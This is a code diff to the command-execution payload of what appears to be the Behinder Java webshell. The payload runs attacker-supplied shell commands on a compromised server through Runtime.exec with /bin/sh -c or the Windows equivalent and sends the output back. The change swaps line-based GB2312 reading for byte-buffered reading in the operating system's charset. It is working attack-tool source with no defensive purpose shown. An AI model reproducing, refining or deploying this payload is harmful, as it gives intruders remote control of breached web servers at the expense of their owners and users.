@@ -1,12 +1,13 @@
 
 package net.rebeyond.behinder.payload.java;
 
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.nio.charset.Charset;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
+
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletOutputStream;
@@ -63,6 +64,7 @@ public class Cmd {
     private String RunCMD(String cmd) throws Exception {
         Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
         String result = "";
+        ByteArrayOutputStream bas= new ByteArrayOutputStream();
         if (cmd != null && cmd.length() > 0) {
             Process p;
             if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
@@ -70,13 +72,21 @@ public class Cmd {
             } else {
                 p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
             }
-
-            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
-            for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
-                result = result + disr + "\n";
+            InputStream is = p.getInputStream();
+            int j = 0,i = 2048;
+            byte [] a = new byte[i];
+            while(-1 < (j = is.read(a, 0, i)))
+            {
+            	bas.write(a, 0, j);
             }
 
-            result = new String(result.getBytes(osCharset));
+//            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
+//            for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
+//                result = result + disr + "\n";
+//            }
+//            result = new String(result.getBytes(osCharset));
+            result = new String(bas.toString(osCharset.name()));
+            is.close();
         }
 
         return result;
